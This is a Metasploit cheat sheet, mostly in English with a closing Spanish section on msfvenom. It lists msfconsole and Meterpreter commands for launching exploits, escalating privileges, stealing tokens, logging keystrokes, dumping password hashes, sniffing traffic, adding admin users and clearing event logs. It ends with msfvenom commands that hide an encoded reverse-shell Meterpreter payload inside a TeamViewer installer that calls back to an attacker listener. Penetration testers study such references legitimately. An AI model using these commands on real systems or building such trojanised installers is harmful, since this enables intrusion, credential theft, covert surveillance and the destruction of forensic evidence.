# Metasploit Framework - Cheat Sheet

---

## 1. MSFconsole Commands

### Module Discovery & Information
| Command / Syntax | Description |
| :--- | :--- |
| `show exploits` | Show all exploits within the Framework. |
| `show payloads` | Show all payloads within the Framework. |
| `show auxiliary` | Show all auxiliary modules within the Framework. |
| `search <name>` | Search for exploits or modules within the Framework. |
| `info` | Load information about a specific exploit or module. |
| `use <name>` | Load an exploit or module (e.g., `use windows/smb/psexec`). |
| `use <number>` | Load an exploit using its index number from `search` results. |

### Module Options & Execution
| Variable / Command | Description |
| :--- | :--- |
| `LHOST` | Local host IP address reachable by target (used for reverse shells). |
| `RHOST` | Remote host or target IP address. |
| `setg <option> <value>` | Set a specific option globally across modules. |
| `show options` | Show available options for the active module. |
| `show targets` | Show supported platforms for the active exploit. |
| `set target <number>` | Select a specific target OS/service pack index. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Select payload index from `show payloads`. |
| `show advanced` | Show advanced module configuration options. |
| `set autorunscript migrate -f` | Auto-migrate payload to a new process on success. |
| `check` | Check if target is vulnerable without exploiting. |
| `exploit` | Launch module against target. |
| `exploit -j` | Run exploit as a background job. |
| `exploit -z` | Run exploit without interacting with session. |
| `exploit -e <encoder>` | Specify payload encoder (e.g., `exploit -e shikata_ga_nai`). |
| `exploit -h` | Display help for the `exploit` command. |

### Session Management
| Command / Syntax | Description |
| :--- | :--- |
| `sessions -l` | List active background sessions. |
| `sessions -l -v` | Verbose session list (includes exploit vector details). |
| `sessions -s <script>` | Run a Meterpreter script on all active sessions. |
| `sessions -c <cmd>` | Execute a command on all active Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade standard OS shell to a Meterpreter session. |
| `sessions -K` | Terminate all active sessions. |

### Database Operations
| Command / Syntax | Description |
| :--- | :--- |
| `db_create <name>` | Create a database for database-driven attacks. |
| `db_connect <name>` | Connect to an existing database. |
| `db_nmap` | Execute Nmap and import results directly to database. |
| `db_destroy` | Delete the current database. |
| `db_destroy <user:pass@host:port/db>` | Delete database using advanced connection parameters. |

---

## 2. Meterpreter Commands

### Core & System Reconnaissance
| Command / Syntax | Description |
| :--- | :--- |
| `help` | Display Meterpreter command help. |
| `sysinfo` | Show target OS, architecture, and system information. |
| `ls` | List files and directories in current target path. |
| `ps` | List running processes and associated user accounts. |
| `migrate <PID>` | Inject Meterpreter into another process ID. |
| `run <scriptname>` | Run Meterpreter script (located in `scripts/meterpreter`). |
| `background` | Background current Meterpreter session. |
| `reboot` | Reboot the target system. |

### Privilege Escalation & Tokens
| Command / Syntax | Description |
| :--- | :--- |
| `getsystem` | Attempt automated privilege escalation to `SYSTEM`. |
| `getprivs` | Enable all available privileges on current token. |
| `use priv` | Load privilege extension for extended capabilities. |
| `use incognito` | Load incognito module for token manipulation. |
| `list_tokens -u` | List available tokens grouped by user. |
| `list_tokens -g` | List available tokens grouped by group. |
| `impersonate_token <DOMAIN\USER>` | Impersonate specific user token on target. |
| `steal_token <PID>` | Steal and impersonate token from process ID. |
| `drop_token` | Stop impersonating current token. |
| `rev2self` | Revert back to original user credentials. |

### Command Execution & Registry
| Command / Syntax | Description |
| :--- | :--- |
| `shell` | Spawn interactive OS command prompt. |
| `execute -f <cmd> -i` | Execute command interactively. |
| `execute -f <cmd> -i -t` | Execute command interactively with all available tokens. |
| `execute -f <cmd> -i -H -t` | Execute hidden background command with all tokens. |
| `reg <command>` | Interact with target Windows registry. |

### Surveillance & File Operations
| Command / Syntax | Description |
| :--- | :--- |
| `upload <file>` | Upload local file to target machine. |
| `download <file>` | Download file from target machine to local system. |
| `screenshot` | Capture screenshot of target display. |
| `setdesktop <number>` | Switch active desktop based on logged-in user. |
| `keyscan_start` | Begin sniffing keystrokes on remote target. |
| `keyscan_dump` | Dump captured keystrokes. |
| `keyscan_stop` | Stop keystroke sniffer. |
| `uictl enable <keyboard/mouse>` | Take control of keyboard or mouse. |

### Credentials & Packet Sniffing
| Command / Syntax | Description |
| :--- | :--- |
| `hashdump` | Dump local SAM database password hashes. |
| `use sniffer` | Load packet sniffer module. |
| `sniffer_interfaces` | List available network interfaces for sniffing. |
| `sniffer_start <ifID> <buffer>` | Start packet capture on specified interface. |
| `sniffer_stats <ifID>` | View statistical data for sniffing interface. |
| `sniffer_dump <ifID> <pcap>` | Save captured network traffic to PCAP file. |
| `sniffer_stop <ifID>` | Stop packet sniffer on specified interface. |

### Persistence & Antiforensics
| Command / Syntax | Description |
| :--- | :--- |
| `add_user <user> <pass> -h <ip>` | Create new local user on target. |
| `add_group_user <"Domain Admins"> <user> -h <ip>` | Add user to specified group. |
| `clearev` | Clear Windows Event Logs (System, Security, App). |
| `timestomp` | Modify file MACE timestamps (Antiforensics). |

## Generación y Modificación de Payloads (`msfvenom`)

### Ejemplo: Inyección en Ejecutable Legítimo (Uso de Plantilla)
Comando de referencia para inyectar un agente dentro de una plantilla ejecutable preservando su flujo original:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
````

#### Parámetros clave para análisis:

- **`-x <ruta>`**: Define el ejecutable base que se usará como plantilla.

- **`-k`**: Mantiene la ejecución original del ejecutable en un hilo secundario.

- `-e <encoder>` / **`-i <num>`**: Especifica el algoritmo de codificación y el número de pasadas aplicadas.

- **`-o <salida>`**: Ruta del archivo resultante.

### Ejemplo: Generación con Codificación y Salida Personalizada

Comando de referencia para generar un *payload* de 32 bits aplicando múltiples pasadas de codificación:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
````

#### Notas de sintaxis:

- **Codificación:** Usa `-e x86/shikata_ga_nai` con `-i 5` para realizar 5 pasadas de codificación sobre el _payload_.

- **Uso de `-k`:** Requiere ir acompañado de `-x <plantilla.exe>` para poder inyectar la carga en un ejecutable legítimo y mantener su funcionalidad.

- **Formato de salida (`-o`):** Guarda el resultado en el archivo especificado. Si se requiere un formato explícito (ej. script, código fuente o ejecutable), es recomendable incluir el parámetro `-f <formato>` (ej. `-f raw`, `-f exe`, `-f js`).